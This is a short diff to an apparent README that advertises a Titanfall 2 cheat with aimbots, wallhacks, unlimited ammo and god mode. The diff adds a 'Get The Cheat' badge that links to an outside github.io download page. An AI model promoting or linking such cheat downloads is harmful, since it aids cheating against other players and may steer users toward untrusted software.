@@ -4,7 +4,7 @@
 
 **Titanfall 2** is one of the fastest-paced shooters ever, with parkour mechanics, giant titans, and lightning-fast gunfights. But with high-skill lobbies and constant action, surviving can be tough. That’s why many players look for a **Titanfall 2 cheat** – from **aimbots and wallhacks** to **unlimited ammo and god mode**, cheats give you the ultimate edge in both pilot and titan combat.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Cheat-blueviolet)](https://titanfall-2-cheat.github.io/.github/)
 ---
 
 ## What Is a Titanfall 2 Cheat?
